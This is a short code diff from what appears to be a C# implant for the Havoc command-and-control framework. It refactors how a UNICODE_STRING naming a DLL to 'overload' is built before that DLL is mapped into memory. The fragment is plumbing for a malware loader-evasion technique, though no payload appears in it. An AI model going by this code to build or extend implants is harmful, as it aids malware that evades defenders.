@@ -73,14 +73,9 @@ namespace HavocImplant.NativeUtils
 
             //Init the UNICODE_STRING argument for mapview
             Structs.UNICODE_STRING dllName = new Structs.UNICODE_STRING();
-            void RtlInitUnicodeString( ref Structs.UNICODE_STRING destinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
-            {
-                destinationString.Length = (ushort)size;
-                destinationString.MaximumLength = (ushort)(size + 2);
-                destinationString.Buffer = Marshal.StringToHGlobalUni(SourceString); //write the string into memory
-                
-            }
-            RtlInitUnicodeString(ref dllName, (@"\??\" + dllToOverload));
+            dllName.Length = (ushort) size;
+            dllName.MaximumLength = (ushort) (size + 2);
+            dllName.Buffer = Marshal.StringToHGlobalUni(@"\??\" + dllToOverload);
             //Map it into memory
             IntPtr pDllName = Marshal.AllocHGlobal(Marshal.SizeOf(dllName));
             Marshal.StructureToPtr(dllName, pDllName, true);
